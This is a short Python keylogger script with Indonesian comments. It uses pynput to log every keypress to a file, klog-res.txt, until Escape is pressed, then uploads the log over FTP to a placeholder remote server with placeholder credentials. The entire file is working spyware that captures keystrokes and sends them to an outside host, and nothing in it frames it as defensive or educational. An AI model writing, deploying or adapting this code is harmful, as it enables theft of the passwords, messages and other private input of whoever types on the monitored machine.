from pynput.keyboard import Key, Listener
import ftplib
import logging

# Menentukan direktori untuk menyimpan file log
direktori_log = ""
# Mengatur konfigurasi logging
logging.basicConfig(filename=(direktori_log + "klog-res.txt"), level=logging.DEBUG, format="%(asctime)s:%(message)s")

def tekan_tombol(key):
    try:
        # Menyimpan setiap tekanan tombol ke file log
        logging.info(str(key))
    except AttributeError:
        # Menangani kasus ketika tombol khusus ditekan, misalnya Shift, Ctrl, dll.
        print("Tombol khusus {0} telah ditekan.".format(key))

def lepas_tombol(key):
    # Menghentikan listener ketika tombol escape ditekan
    if key == Key.esc:
        return False

print("\nMulai mendengarkan....\n")

# Memulai listener untuk menangkap tekanan dan pelepasan tombol
with Listener(on_press=tekan_tombol, on_release=lepas_tombol) as pendengar:
    pendengar.join()

print("\n Menghubungkan ke FTP dan mengirim data.....")

# Membuat sesi FTP dengan server
sesi_ftp = ftplib.FTP("<ip ftp>", "username", "password")
# Membuka file log dalam mode baca biner
file_log = open("klog-res.txt", "rb")
# Mengunggah file log ke server
sesi_ftp.storbinary("STOR klog-res.txt", file_log)
# Menutup file log setelah selesai
file_log.close()
# Mengakhiri sesi FTP
sesi_ftp.quit()